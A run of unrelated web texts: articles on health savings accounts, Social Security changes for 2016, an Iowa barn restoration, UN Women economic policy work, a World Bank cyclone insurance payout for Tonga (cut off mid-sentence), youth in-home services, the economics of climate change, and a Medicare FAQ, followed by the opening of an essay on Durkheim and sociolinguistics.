Premiums are typically lower for HDHPs than they are for traditional HMO and PPO health plans; members usually pay more upfront for services such as physician visits, surgical treatment, and prescriptions, but they typically receive the insurer’s negotiated discounts.
Contribution Rules
The maximum HSA contribution limit in 2019 is $3,500 if you have individual coverage or $7,000 if you have family coverage. An additional $1,000 can be contributed starting the year you turn 55. Some employers make an annual contribution to employees’ HSAs.
Once in your lifetime, you can make a tax-free rollover from your IRA to an HSA (subject to maximum annual contribution limits), as long as you have HSA-eligible HDHP coverage. Transferring money to an HSA avoids the tax bill and potential penalty you would have if you withdrew money from a traditional IRA to pay medical bills. However, you must continue to be enrolled in an HSA-eligible HDHP for 12 months after the transfer, or the IRS will consider it to be a taxable IRA distribution.
Another Retirement Resource
A well-managed HSA could play an important role in your long-term retirement strategy. Although HSA funds cannot be used to pay regular health plan premiums, they can be used for Medicare premiums and qualified long-term care insurance premiums and services during retirement. Once you sign up for Medicare, however, you can no longer contribute to an HSA.
If you can afford to fund your HSA generously while working, some of those dollars could be left untouched to compound on a tax-deferred basis for a number of years. When HSA balances reach a certain threshold, the money can be steered into a paired account with investment options similar to those typically offered in a workplace 401(k).
You could also pay current medical expenses out of pocket and preserve accumulated HSA assets for use during retirement. But save your receipts — you might want to reimburse yourself down the road if you have an unexpected cash crunch.

Social Security: What’s Changing in 2016?
Whether you will soon be applying for Social Security, or are already receiving benefits, here’s what you need to know about what’s changing (and not changing) in 2016.
What’s Not Changing
No Cost-of-Living Increase: Because inflation was unchanged from the third quarter 2014 to the third quarter 2015, there will be no increase in benefit payments to current recipients in 2016.¹
Tax Cap Remains Unchanged: For workers, the cap on wages subject to Social Security withholding stays at $118,500.²
Earnings Limit: The amount that any Social Security recipient can receive in compensation without a reduction in his or her Social Security benefits remains unchanged from 2015 at $15,720 (under the full retirement age) and $41,880 (the year an individual reaches full retirement age).³
Medicare Part B Premium: Since the law prohibits Medicare premiums from rising faster than Social Security benefits, most retirees will see no increase in Part B premium costs. However, first-time enrollees in 2016 and high-income Medicare beneficiaries may pay a higher premium.
What’s Changing
Better Customer Service: Look for online services to expand, self-service kiosks at field offices to increase and reduced wait-times for a hearing decision.
Benefit Maximization Strategies: The file-and-suspend and restricted application strategies that worked to maximize the income benefits from Social Security have been eliminated, though the law does provide some grandfather protections.
Elimination of Revoking Suspended Benefits: Individuals who filed for benefits and then suspended them to gain a future, higher payout previously had the flexibility to “un-suspend” benefits in the event of a life-threatening illness or change in financial circumstances and receive a retroactive lump sum payment. This flexibility will no longer exist.
Social Security Administration, 2016. The Social Security Act specifies that cost of living are based on increases in the Consumer Price Index for Urban Wage Earners and Clerical Workers.

Barn gets a new lease on life
Todays News
Jan 24, 2016
LAKE CITY – At a time when the era of barn construction had virtually drawn to a close, William “Bill” Owens built a new barn on his farm south of Lake City after a tornado destroyed the original barn in 1957.
“The old barn had been built around the turn of the 20th century,” said Kathy Owens Wine, who is Owens’ daughter. “After the 1957 tornado, my dad started building a new barn on the site, but with a 2-foot larger foundation.”
Owens designed the barn to suit his Angus cattle operation and shelter his horses, Wine said.
Some of the lumber from the original barn was salvaged and incorporated into the new barn, which was completed in 1958.
“Our dad encouraged my sisters and me to put our names and handprints in the concrete in the north threshold,” said Wine, executive director of River Action in Davenport, which works to enhance the environmental, economic and cultural vitality of the Mississippi River and its river front in the Quad City region.
After Owens retired, the farm was later rented out.
Tenants raised livestock in the barn for a number of years until recently.
As time and the elements took their tolls on the barn, Owens and her family decided to restore the barn.
They received a grant from the Iowa Barn Foundation to help complete the project.
In 2015, Wine and her family hired Paul Dowling, of Lake City, to restore the barn, which now showcases a gleaming new roof and other improvements.
“This is a magnificent barn, inside and out,” said Jacqueline Schmeal, who created the Iowa Barn Foundation in 1997. “The owners have kept it original and did a beautiful job restoring it with care.”
Statewide visitors
Hundreds of visitors from the local area and across the state stopped by the Owens barn on Sept. 26-27, when the barn was featured during the Iowa Barn Foundation’s 15th annual All-State Barn Tour.
As guests explored the main level and the hay mow, the band, “In Rooms,” played live music in the barn on the afternoon of Sept. 26.
Visitors were intrigued by the barn’s architectural features, including Starline metal ventilating barn window frames, which were manufactured in Illinois.
Schmeal said she’s glad the Iowa Barn Foundation and barn owners like the Owens family continue to offer opportunities for people to explore Iowa’s rural heritage.
“Can you imagine Iowa without barns?” Schmeal asked. “Each barn tells a story of a farmer, his family and their livelihood.”
While barns are no longer needed in modern agriculture, that doesn’t mean they don’t still have a purpose, Schmeal added. “Barns are still important symbols of our heritage.
“We’re at a time when it’s now or never for preserving barns, and some must be saved.”

What we do
Economic empowerment
Macroeconomic policies and social protection
Macroeconomic and social policies are crucial instruments guiding the achievement of women’s empowerment and gender equality. Macroeconomic policies do not necessarily affect men and women in the same ways. Gender-blind policies can perpetuate limits on women’s ability to gain decent employment, for example. Given wide gaps between women and men in access to jobs and other economic assets, policies deliberately crafted to close these stand a far greater chance of improving women’s lives and advancing gender equality. Social protection policies play important roles in opening women’s access to labour markets, addressing economic risks faced by working families, and helping poor households meet basic needs.
Our solutions
UN Women works with government partners to devise and implement macroeconomic policies that can deliver results for women, touching on issues such as links between women’s paid work and inclusive growth, the impacts of economic crisis, and the role of gender in agriculture and trade policy. We provide analysis and data to inform more gender-responsive policies, and assist public officials and gender equality advocates in acquiring skills to design and implement them. By bringing together policymakers with feminist and progressive economists, we encourage the sharing of knowledge and new ideas.
In Albania, state family subsidies once went primarily to men because they were automatically considered the heads of households. UN Women helped the Government revise its Law on Economic Aid and Social Services to recognize economically vulnerable women. New groups eligible for grants include trafficked women, survivors of domestic violence and women filing for divorce.
UN Women joined the Food and Agriculture Organization in Côte d’Ivoire to advocate highlighting women’s priorities in the most recent National Agricultural Investment Plan. Initiatives to implement the plan now include one in the Indénié-Djuablin region, where women make up half the members of the programmes’ governing committee, and have a special allotment of the land provided under it.
In Rwanda, UN Women supported civil society groups in analysing the gender responsiveness of spending on agriculture, a sector where many women make their livelihoods. The data they collected informed advocacy that, from 2009 to 2011, encouraged a 26.3-per-cent jump in Rwanda’s agricultural budget. UN Women continues to work with the groups in monitoring gender-related expenditure of the new funds.
In Bolivia, UN Women backed an alliance of 12 women’s organizations seeking to integrate women’s rights provisions in laws and regulations. As a result of their advocacy, the national budget now formally recognizes unpaid care work, opening the door to the development of specific policies and allocation of resources to assist women struggling to manage multiple roles.
Globally, we support the UN Social Protection Floor initiative, which advocates universal access to basic services and social transfers of cash or goods to ensure income and food security. In 2011, The World Bank agreed to finance stronger social safety nets in Grenada through a system of cash transfers for poor households, including those headed by women. The agreement for the programme, funded by a zero-interest loan, drew directly on research undertaken by UN Women in partnership with UNICEF and the Bank.
Through the EDGE Initiative, UN Women is part of a new collaborative effort to generate internationally comparable indicators on health, education, employment, entrepreneurship and assets broken down by gender. The data will provide essential information in determining the extent of gender inequality and inform more targeted and efficient support for women’s empowerment.
Under the Gender Economic Policy Management Initiative, we partner with UNDP to provide short courses on gender and economics for policymakers, and support a masters’ degree in gender-aware economics.

Cyclone Ian Triggers First Pacific Catastrophe Risk Insurance Payout
SYDNEY, January 23, 2014 – The World Bank today announced that Tonga will be the first country to benefit from a payout under the Pacific Catastrophe Risk Insurance Pilot and will receive an immediate payment of US $1.27 million towards recovery from Cyclone Ian.
The Category 5 Cyclone, which swept across Tonga’s Ha’apai island group on January 11th and 12th 2014, caused one tragic death, displaced thousands and caused major devastation to crops and infrastructure. According to reports, up to 75 percent of buildings have been damaged in some parts of Ha’apai, as well as power and communication networks.
“Cyclone Ian has affected hundreds of families in several communities, destroying people’s homes and critical infrastructure such as health centers and schools,” said Franz Drees-Gross, World Bank Country Director for the Pacific Islands. “Funds received under the scheme will allow the government to meet some of those urgent needs as they look to repair and rebuild in the days and weeks ahead.”
"The cash received from the catastrophe risk insurance pilot makes an important financial contribution for carrying out the government strategy for mitigating natural disasters, to ensure that response efforts to help the people of Ha'apai recover and return to their normal everyday lives can continue without interruption or delay," said Minister for Finance and National Planning in Tonga, Hon. Dr. ‘Aisake Valu Eke.
Tonga is one of 6 Pacific island countries – together with Cook Islands, Marshall Islands, Samoa, Solomon Islands and Vanuatu - currently participating in the Pacific Catastrophe Risk Insurance Pilot. Launched in January 2013, the pilot tests a risk transfer arrangement modeled on an insurance plan, and uses ‘parametric triggers’, such as cyclone intensity or earthquake magnitude to determine payouts, which allows for quick disbursements.
The World Bank acts as an intermediary between Pacific island countries and a group of reinsurance companies – Sompo Japan Insurance, Mitsui Sumitomo Insurance, Tokio Marine & Nichido Fire Insurance and Swiss Re. AIR Worldwide provides the underlying risk modeling for the transaction. The Government of Japan currently co-finances the insurance premiums of Tonga, Marshall Islands, Samoa, Solomon Islands and Vanuatu. Cook Islands fully fund their insurance premium from their own sources.
As part of a broader response to Cyclone Ian, the World Bank is also supporting damage assessments in Ha’apai that will enable the Government of Tonga to gain a full picture of the damage sustained, so that it can rebuild affected areas and increase disaster resilience for the future.
About the program: The Pacific Catastrophe Risk Insurance Pilot is part of the Pacific Disaster Risk Financing and Insurance (DRFI) program that is designed to increase the financial resilience of Pacific island countries against natural disasters by improving their capacity to meet post-disaster funding needs. Through DRFI, advisory services are made available for public financial management of natural disasters, including (i) the development of a national disaster risk financing strategy, recognizing the need for ex-ante and ex-post financial tools; (ii) post disaster budget execution, to ensure that funds can be accessed and disbursed easily post disaster; and (iii) the insurance of key public assets, to contribute to post disaster reconstruction financing.
The Pacific DRFI Program is part of the Pacific Catastrophe Risk Assessment and Financing Initiative (PCRAFI), a joint initiative of the World Bank, the Secretariat of the Pacific Community SPC/SOPAC, and the Asian Development Bank with financial support from the Government of Japan, the Global Facility for Disaster Reduction and Recovery (GFDRR) and the ACP-EU Natural Disaster Risk Reduction Programme. PCRAFI, launched in 2007, aims to provide the Pacific

Therapeutic Day Treatment
Youth for Tomorrow (YFT) provides two levels of In-Home Services, Intensive In-Home Services and Supportive In-Home Services. They are both based on the philosophy that children and adolescents are best cared for within their home and community whenever it is possible. Services are generally time-limited, family focused and delivered in the home. In-Home Specialists help you and your family address behavioral and emotional issues.
Services include:
Comprehensive and timely assessment
Individualized, strengths-bases treatment plans
Therapeutic services delivered in the home and community
Family and individual interventions
Parental coaching and skill development
Safety and coping skills development
Psychoeducation
Case coordination
24 hour crisis support and response
Services begin with a comprehensive evaluation completed by a Licensed Mental Health Professional. An Individualized Service Plan is developed with the family and is used to guide services. The plan is reviewed regularly to evaluate progress and updated as needed. All services are delivered by Licensed Mental Health Professionals or Qualified Mental Health Professionals under the supervision of Licensed Mental Health Professionals.
What is the purpose of In-Home Services?
The purpose of home-based services is to provide comprehensive services to at-risk children, adolescents and families in order to stabilize the family and maintain the home environment, establish and work on treatment goals and facilitate the use of community resources by the family.
We can help families with:
Aggressive and/or Acting Out Behaviors
Impulse Control
Symptoms of Anxiety and Depression
Symptoms of Trauma
School Issues
Family Relationships and Communication
Behavior Management
Anger Management and Conflict Resolution
Life Skills (communication, money management, time management, and social skills)
What population does Intensive In-Home serve?
Intensive In-Home Services supports children and adolescents and their families, when behavioral and mental health issues may result in removal form the home environment without timely intervention. Additionally, children and adolescents who are transitioning home from an out-of-home placement such as foster care, detention, or residential programs may be appropriate for services. This service may be funded by Virginia Medicaid.
What population does Supportive In-Home serve?
Supportive In-Home Services are provided to youth and their families in the home and community to support the family through crisis or manage the behavioral or mental health needs of a youth.
How are Services Accessed?
To schedule an appointment or to find out more information as to how services can be accessed please contact YFT's In-Home Coordinator at 703-425-9200.

I was born too early to benefit much from Sesame Street, but I still loved The Muppets. Kermit the Frog was my favorite character; alternatively in full control and overwhelmed, Kermit struggled to make sense of the nonsensical. To this day, there are times that I feel confronted with the same challenge.
Kermit produced numerous pearls of wisdom, such as:
“Beware of advice from experts, pigs, and members of Parliament.”
“It’s nice to be important. But it’s important to be nice.”
“May success and a smile always be yours…even when you’re knee deep in the sticky muck of life.”
Among Kermit’s more famous quotes was “It’s not easy being green.” Kermit’s lament came to mind several times recently, during economic conferences that touched on the impact of climate change. As the earth warms and the consequences of warming become more apparent, the issue has reached heightened prominence. Debate is now centered on whether markets or mandates are the best tool to bend the carbon curve.
We detailed the situation in last fall’s essay, “Changing Climate.” The globe has set a long string of record temperatures, and the frequency of severe storms has increased. Recognition that human production of carbon dioxide (CO2) has played a role in the process has become widespread, as has the resolve that something needs to be done.
Arresting the problem will require significant structural and behavioral changes. Accelerating the shift of power generation to environmentally-friendly fuels would require scrapping existing facilities and making substantial investments in new ones. In a similar vein, shifting cars from internal combustion engines to batteries will not be done cheaply or easily. These are just two of the many frictions that make the transition to a greener future expensive and difficult. And the faster the transition, the more significant these frictions become.
Furthermore, reducing carbon footprints will almost certainly be accompanied by substantial economic dislocations. We’ve already seen examples of this in coal-producing regions around the world; we may one day also see them in areas that produce other fossil fuels. If one country moves more aggressively than others, it risks placing its industries at a competitive disadvantage. Transition plans will have to be carefully crafted.
Addressing climate change has been difficult for politicians. They are often focused on the electoral cycle, which is much shorter than the time frame over which the consequences of a warming planet will be felt. But we are all at fault: behavioral scientists have established that human beings have inherent trouble estimating the long-term consequences of our behavior. Dealing with long-term issues like climate change is easily deferred.
It does appear that global policymakers are beginning to take the topic up in earnest, though. Proposals to slow global warming fall into two categories: regulatory and market-based. In the former are concepts like the Green New Deal, which has been advanced by some of the newcomers to the U.S. Congress. (And which is covered in a separate segment in this issue.) Its targets present a high bar for industry and households to clear.
On the market side are approaches like carbon taxes or cap-and-trade systems. Forty countries are already using one of these two devices, which attempt to provide incentives for producers and consumers to reduce emissions. Monies generated from carbon taxes are often used to promote investment in clean technology; cap-and-trade markets have the advantage of setting a desired level of emissions and letting market participants work towards equilibrium.
The private sector is also pressing a greener agenda. A broadening number of firms are issuing regular reports on corporate social responsibility, which highlight their efforts to operate sustainably. (Northern Trust’s most recent report can be found here.)
Building on this, a rising number of portfolio managers is using environmental, social and governance (ESG) screens to select candidates for investment. Among the criteria used by these programs is impact on the environment; if the company is deemed to be too carbon-heavy, its stock is ineligible for ownership. To those who worry about sacrificing returns, the data suggest that stocks of sustainable companies tend to outperform their less sustainable counterparts.
For investors who want to do something more directly to improve the environment, the “green bond” market offers an alternative. Proceeds from these issues are used to finance projects that address climate change. Examples include windmill farms, hydroelectric facilities and low-emission transportation systems.
Among the challenges faced by green bond underwriters is determining what projects are truly “green,” and how to verify that the investments are delivering on their environmental goals. Nonetheless, interest in the sector is increasing, and the market is growing rapidly.
Containing climate change will be costly. Decisions on when to incur the cost, and who will bear it, make the way forward difficult. But the cost of doing nothing may be more substantial. Damage done by natural disasters will require repair and re-insurance. Humanitarian aid for those forced to migrate from arid habitats could be substantial. And studies have suggested that the U.S. economy alone could shrink by as much as 10% this century if global warming continues at its recent rate.
So in the end, Kermit was right: it isn’t easy being green. But ultimately, we may have no choice.
Green Overshoots
Advocates for correcting climate change have gotten little love from the U.S. Congress. Even moderate approaches to deal with the problem have gone nowhere. Some congressional Democrats are now taking the opposite tack: Declare a bold strategy that enumerates the party’s goals in the extreme, and use it to frame future discussions.
The Green New Deal (GND) follows this course. Its actual text is a brief, simple resolution: among other things, it calls for 100% of power to be generated from renewable sources, zero-emission transportation, efficient buildings and clean manufacturing. Its goals are broad (universal medical care and retirement security are also mentioned) and details are sparse.
Proponents of the GND say this light design is deliberate. Just as the Depression-era New Deal was an amalgam of job creation programs, the GND comprises a wide range of initiatives to protect the environment.
Some of the criticism of the Green New Deal has focused on its cost. Estimates for implementation are as high as $93 trillion over ten years, though the resolution’s lack of specifics leaves room for pessimistic assumptions. Supporters offer two responses. First, climate change’s casualties and losses are also substantial. And second, the United States holds the world’s reserve currency, and the Federal Reserve has an unbounded ability to purchase the bonds required to fund GND initiatives. This application of modern monetary theory carries risks and has many detractors, not the least of whom is Fed Chair Jerome Powell.
We view the GND less as a proposal that has much chance of passage and more as an indication of how the climate change discussion is rapidly changing. Environmental impacts will become a necessary factor in any political or business decision. Arguments against future bills will need more justification than their high expense. Whatever the GND’s fate, its intent will make a lasting mark.
Snail’s Pace
For decades, petroleum has been the mainstay of the global energy system. Entire nations have structured their economies around the production and consumption of oil. But with greater recognition of the risks of climate change, we might be witnessing the decline of the Petroleum Era and the onset of the “Age of Alternatives.” Renewable supplies generated from the sun, the wind and the water are already playing a growing role in the world’s energy supply.
Energy intensity has been declining since the 1980s due to structural changes in production and consumption that have stressed more efficient use of resources. Despite this, world energy demand has continued to rise, and will likely continue doing so. Demand from advanced economies may plateau or even decline in the years ahead, but demand from populous, prospering developing nations such as India and China will remain on an upward trajectory.
Oil and natural gas are likely to continue providing the bulk of global energy needs, particularly in the transport sector. However, the share of fossil fuels in the global energy mix is forecast to diminish gradually over time. The speed of adjustment will be determined by public policy and the private sector.
A slow transition means oil-rich nations will likely have a long window of opportunity to diversify their economies and reduce their dependence on fossil fuel production. Many of the advanced nations that produce oil, such as the United States and Canada, have diversified economies. Reduced demand or fuel prices won’t deliver a major shock to these markets.
Some oil-dependent nations will have a hard time adapting to the new reality. Certain countries with unfavorable geographic locations, dysfunctional government and a high reliance on fossil fuels, such as Nigeria, Venezuela and Iran, will struggle to diversify their economic development. These nations have profited from higher fuel prices but incurred heavy costs during downturns in energy demand and prices. Episodes such as the one currently enveloping Venezuela demonstrate that difficult economic times can lead to political unrest.
Other leading Middle Eastern countries (such as Saudi Arabia and the United Arab Emirates) remain heavily reliant on hydrocarbons, but have accumulated enough wealth to buy time to adapt. These nations are already making efforts towards diversification and have laid out plans aimed at that objective.
This diversification will hold the key to future prosperity for oil-rich nations. Development of oil refineries might temporarily help those states involved in extraction of petroleum from beneath the earth’s surface, but not in the long run. For enduring success, nations will have to invest significant amounts in developing industries other than oil and natural gas. But because oil production remains the path of least effort for near-term growth, their perseverance may be tested.
Plentiful sunlight in the Middle Eastern and African regions is ideal for generation of solar energy, meeting both domestic and rising regional demand. Other diversification measures could include the development of policies to attract foreign investment in different sectors, increased investment in infrastructure and the use of modernized irrigation techniques to boost food output.
A well thought-out tourism strategy could also boost economic development. Dubai has grown its tourism sector remarkably, representing 20% of Dubai’s gross domestic product and about 6% of total employment. Saudi Arabia is also making efforts to boost tourism and develop other industries by channeling investments in chemicals, technology and healthcare sectors.
Governments in many hydrocarbon-dependent nations have recognized that crude oil can no longer be the only economic engine, but they have shown little urgency to stimulate this move. Skeptics today see a lack of credible alternatives and predict the transition will be slow.
But the transition to alternative energy and alternatives to energy must start now. Saudi Crown Prince Mohammed bin Salman recognized the “dangerous addiction to oil” that the Middle East faces. Recognizing the problem is only the first step toward a solution; solving it must follow.

Frequently Asked Questions
2018 Information
2019 Information
Below you’ll find answers to common questions people have about Medicare. If you still have questions, call us. We are here to help!
What is Medicare?
Medicare is the federal health insurance program for people who are 65 or older, certain younger people with disabilities, and people with End-Stage Renal Disease (permanent kidney failure requiring dialysis or a transplant, sometimes called ESRD).
Medicare has four parts – Parts A, B, C & D.
Parts A &B is known as Original Medicare. Benefits are provided by the federal government (not a private insurance company) and may not cover all of your healthcare needs. That is why many Medicare beneficiaries choose a Medicare Advantage plan (also known as Part C). Medicare Advantage plans are offered by private insurance companies, such as Allwell from Superior HealthPlan.
What is Medicare Part A?
Medicare Part A is hospital insurance that helps cover:
Inpatient care in hospitals
Skilled nursing facility care
Hospice care
Home health care
What is Medicare Part B?
Medicare Part B is medical insurance that helps cover:
Services from doctors and other health care providers
Outpatient care
Durable medical equipment
Many preventive services
What is Medicare Part C?
Medicare Part C includes Medicare Advantage plans offered by private insurance companies as an alternative to Original Medicare. If you join a Medicare Advantage Plan, you’ll still have Medicare but you’ll get your Medicare Part A (Hospital Insurance) and Medicare Part B (Medical Insurance) coverage from the Medicare Advantage Plan, not Original Medicare. Medicare Advantage plans include all the benefits of Medicare Parts A and B, PLUS extra benefits not available through Original Medicare. Medicare Advantage plans vary but they may include additional benefits such as:
Vision benefits
Dental benefits
Hearing benefits
Fitness or gym membership
The additional benefits provided by Medicare Advantage plans vary by plan so it is important for Medicare beneficiaries to look for a plan that meets their full healthcare needs.
Many times these plans will have little or no premium.
Most Medicare Advantage plans have a network of doctors, hospitals and other providers you need to use in order to get the lowest cost of care. If you don’t use the network providers, you may pay more for the costs associated with your care.
Private insurance companies must be approved by the government to offer a Medicare Advantage plan.
What is Medicare Part D?
Medicare Part D helps cover the cost of prescription drugs. Prescription drug coverage is NOT included in Original Medicare so beneficiaries who want this coverage must enroll in either a Medicare Advantage plan that includes prescription drug coverage (MAPD) or purchase a separate Prescription Drug Plan (PDP). If you do not have creditable prescription drug coverage (drug coverage at least as good as Medicare), for 63 days or more after the end of the Initial Enrollment Period for Part D coverage, you will have to pay a Late Enrollment Penalty (LEP).
Part D plans are offered by Medicare-approved private insurance companies that must follow rules set by Medicare.
Medicare Advantage Prescription Drug (MAPD) plans, like Allwell, combine Part A (hospital insurance) and Part B (medical insurance) coverage along with Part D (prescription drug coverage) into one complete plan to fit your needs.
What's the difference between Medicare & Medicaid?
Medicare and Medicaid are two different programs.
Medicare is America's health insurance program for people age 65 or older, people under 65 with certain disabilities, and people of any age with End-Stage Renal Disease (ESRD) (permanent kidney failure requiring dialysis or a kidney transplant). Originally established in 1965, the program helps to cover the cost of health care for nearly 49 million people.
Medicaid is a joint federal and state program that helps pay medical costs for people who have limited income and resources. Eligibility rules and coverage are determined by each state.
Some people qualify for both Medicare and Medicaid and are called "dual eligibles." For more information or to see if you qualify, contact your Medicaid office. You can also visit https://www.medicare.gov/contacts/, or call 1-800-MEDICARE (1-800-633-4227) and say “Medicaid” to get the phone number. TTY users should call 1-877-486-2048.
What is D-SNP?
D-SNP stands for Dual Eligible Special Needs Plan. This is a type of Medicare Advantage plan available to people who qualify for both Medicare and Medicaid. These plans allow people who are eligible to enjoy better coverage by combining Medicare and Medicaid benefits under one plan and insurance company. These plans also include prescription drug coverage.
To be eligible for enrollment in a D-SNP, you must meet specific eligibility requirements. As an example, the type of D-SNP you qualify for may depend on the level of Medicaid eligibility you receive.
How much does Medicare cost?
The Medicare program is largely funded by the government through payroll taxes paid for by both employees and employers. You usually don’t pay a monthly premium for Part A coverage if you or your spouse paid Medicare taxes while working. You pay a premium each month for Part B. Some people with higher annual incomes pay a higher Part B premium. These amounts can change each year.
Who pays for Medicare Advantage?
Depending on which type of Medicare Advantage plan coverage you choose, you may pay a monthly premium, which could be deducted from Social Security checks or paid directly to your insurer. Many times, Medicare Advantage plans are available with no additional monthly premium beyond the cost of Original Medicare. If you join a Medicare Advantage (MA) Plan you must continue to pay the monthly Medicare Part B premium. You also pay deductibles, coinsurance and copayments that are different from Original Medicare. The costs vary from plan to plan.
Can I get help paying my plan premium?
If you have lower income, and are eligible for Medicare, your state Medicaid program may assist you with premiums and cost sharing.
Who can enroll in a Medicare Advantage plan?
To be eligible to enroll in a Medicare Advantage Plan, you must:
Have Medicare Part A and Part B
Live in the plan’s service area
Not have End-Stage Renal Disease (ESRD) (with limited exceptions)
Be a U.S. citizen or lawfully present in the United States
When can I enroll in a Medicare Advantage plan?
Medicare beneficiaries can only enroll in Medicare Advantage plans during certain times of the year. When you first become eligible for Medicare, you can sign up during your Initial Enrollment Period. During the Annual Election Period (also known as Open Enrollment), anyone with Medicare can join, switch, or drop a Medicare Advantage Plan. Generally, you may not make changes at other times unless you meet certain special exceptions, such as if you move out of the plan’s service area, want to join a plan in your area with a 5-star rating, or qualify for extra help with your prescription drug costs. See below for more information.
Initial Enrollment Period (IEP) is the seven-month window around your 65th birthday. Use this time to review your options and select the plan with coverage that best fits your needs. When you first become eligible for Medicare, you'll likely be automatically enrolled in Original Medicare by the Social Security Administration. You'll have time to select supplemental or prescription drug coverage, decline Part B coverage, or choose to purchase a Medicare Advantage plan in place of Original Medicare.
Annual Election Period (AEP) happens between October 15 and December 7 each year. This is a designated time period each year for everyone eligible for Medicare to update their coverage. During the AEP, you have the option to keep your current plan, choose a different plan, or return to Original Medicare. Your coverage will begin on January 1st of the following year, as long as the plan receives your request by December 7th.
Special Enrollment Period (SEP) is a period of time surrounding an event in your life that affects your Medicare coverage. In most cases, you must stay enrolled for the calendar year starting the date your coverage begins. However, in certain situations, you may be able to join, switch, or drop a Medicare Advantage Plan during an SEP. If you move out of our plan’s service area, have Medicaid, qualify for Extra Help, or experience the loss of health insurance coverage that was previously provided through a job, spouse or union health insurance, you may qualify for an SEP. If you are eligible for a Medicare Advantage Special Needs Plan (SNP), you do not need to wait for an enrollment period.
How do I enroll in Medicare Advantage?
There are several ways! You can enroll by phone, by mail/fax or enroll online. Visit our How to Enroll page for more details.
Can I change my plan once I sign up?
Yes- you may change your coverage during the Annual Election Period: October 15 – December 7. To switch to Original Medicare, contact your current plan provider, or call 1-800-MEDICARE. TTY users should call 1-877-486-2048. Medicare can be reached 24 hours a day/7 days a week.
To switch to a new Medicare Advantage Plan, simply join the plan you choose during one of the enrollment periods. You'll be dis-enrolled automatically from your old plan when your new plan's coverage begins.
Do Medicare plans renew automatically?
Yes! In most cases, your current Medicare coverage will renew automatically each year unless you make changes to your coverage. You may choose to change your coverage during the Annual Election Period: October 15 – December 7.
If you are a member of a Dual Eligible Special Needs Plan (DSNP), your renewal is contingent upon your Medicaid eligibility.
If you qualify for a Special Enrollment Period, you can change plans according to the situation that is allowing you a Special Election Period.
What's the difference between Original Medicare and Medicare Advantage?
Original Medicare includes hospital insurance (Part A) and medical insurance (Part B). Your coverage under Original Medicare will include deductibles, coinsurance and copayments for various services. Original Medicare does not cover prescription drugs and may not cover services for vision care, dental or hearing.
Medicare Advantage plans offer the same coverage as Part A and Part B but many also include extra benefits such as dental, vision and hearing care. Many of your services in a Medicare Advantage plan will be covered by a copayment or coinsurance, which allows you to know exactly what your healthcare expense will be. Not all Medicare Advantage plans are alike, so you have to look for the one that has the benefits, services and costs that work for you.

Durkheim and the internet: On sociolinguistics and the sociological imagination.
Jan Blommaert
A man with one theory is lost
(Bertolt Brecht)
Sociolinguists as sociologists
Over two decades ago, the Welsh sociologist Glyn Williams (1992) wrote a devastating review of the sociological underpinnings of the sociolinguistics of his day.[1] His findings were (not to put too fine a point on it) that sociolinguistics was often a combination of very good and even avant-garde linguistics with conventional sociology. So, while sociolinguists appeared as leaders and innovators in the field of advanced linguistic analysis, they would be mere followers in the field of sociological reflection, happy to adopt, often implicitly and without much questioning or motivation, mainstream forms of “sociological imagination” (cf. Mills 1959). This led to images of society characterized by social integration, social consensus and cooperation, the relative stability of social relations and identities, and clearly delineated national units and group identities as circumscriptions for analysis – recipes from the kitchen of Talcott Parsons, according to Glyn Williams.
It is certainly true that sociolinguists have by and large avoided discussing major theoretical issues in sociology and social science, and have been extremely prudent in explaining the big sociological issues that may emerge from their work.[2] This is a great pity, since contemporary sociolinguistic work does often yield insights that are challenging mainstream sociological assumptions, and do so at a fundamental level – the level at which, to quote C. Wright Mills (1959: 5), “the framework of modern society is sought, and within that framework the psychologies of a variety of men and women are formulated”. The level, in short, at which we can form a “sociological re-imagination”, a re-imagination of our fundamental conceptions of humans and their social lives. In this text, I intend to undertake a modest attempt in that direction.
The main motive driving this attempt has already been given: contemporary sociolinguistics is sociologically relevant. And the reason behind this can be picked up quickly while reading sociological classics: they invariably refer to patterns of interaction as fundamental to whatever is understood by social relationships, social structure or social process – and usually also grant great importance to this. To quote just one of them, this is how Georg Simmel defined the task of sociology:
“Sociology asks what happens to men and by what rules they behave, not insofar as they unfold their understandable individual existences in their totalities, but insofar as they form groups and are determined by their group existence because of interaction.” (Simmel 1950: 11, emphasis added)
Yet, with a mere handful of exceptions, they pay hardly any attention to the actual nature and features of such patterns of interaction.[3] Sociolinguists do just that, it’s our profession. And systematic attention to communicative modes and processes, we shall see, has the potential to reveal the weakness of certain commonly adopted sociological assumptions and conclusions. It is my conviction that the “socio” in “sociolinguistics” involves the responsibility to work from language towards society. What eventually needs to be clarified and explained, through the analysis of sociolinguistic processes, is society and how humans operate in it and construct it. This becomes increasingly pressing as our field of study is changing from “offline” communication in a precisely circumscribed social space to include rapidly evolving and changing delocalized “online” communication, with its well-recorded challenges to established analytical frameworks. I want to encourage my fellow sociolinguists to take that responsibility seriously: we do have something to say that transcends the narrow confines of our own field of inquiry, and we should say it. Sociolinguists are, whether they like it or not, specialized sociologists.[4]
In my attempt, I will use Emile Durkheim’s work as my benchmark. Why? Not just because of its pervasive influence on Parsons. From reading Durkheim’s work I found that his lasting influence across a broad swath of social and human sciences is often underestimated. It is in his work that the fundamental imagery of Man and society was constructed that became the perimeter, so to speak, within which twentieth-century social thought moved and developed. And even if later scholars dismissed his work or claimed to be free of his influence, they still adopted some of its fundamental principles. We’re all, in many and often surprising ways, still Durkheimians.[5] And in what follows, I intend to work with Durkheim in two different ways.
One, in support of Durkheim, I wish to add to, and refine, a notion he saw as absolutely foundational for sociology as a science: le fait social, the social fact. This notion, when Durkheim first formulated it, was highly contested (to the extent that Durkheim spent most of the preface to the second edition of Les Règles de la Méthode sociologique defending and clarifying it: Durkheim 1895 [2010]). It was also rejected in what came to be known as Rational Choice Theory and, more generally, it clashed with the tradition of Methodological Individualism. The notion of social fact, of course, determines the possibility of a definition of “the social” as a sphere of phenomena and processes that cannot be reduced to constituent parts without losing much of their essence. Thus, it also preconditions the very possibility of a sociology and a sociolinguistics. A highly precise and analytically powerful view of the social fact is possible if we excerpt some advanced sociolinguistic work, I shall argue.
Two, we need also to step away from Durkheim and the world he tried to make sense of and consider our own. There are things now that Durkheim couldn’t possibly have known or predicted, and contemporary sociolinguistic work on internet phenomena raises several entirely new fundamental questions about the nature of social groups, social relations and social processes and permits new hypotheses in these domains. By combining this second exercise with the first one, we arrive at a number of fundamental propositions – at theory, in other words – that may contribute to work in several other disciplines, and that has been generated inductively by detailed empirical attention to the facts of language, interaction, communication. Of which we know that they are absolutely central to any social phenomenon. Or at least: let’s try to establish that.[6]
Durkheim’s social fact
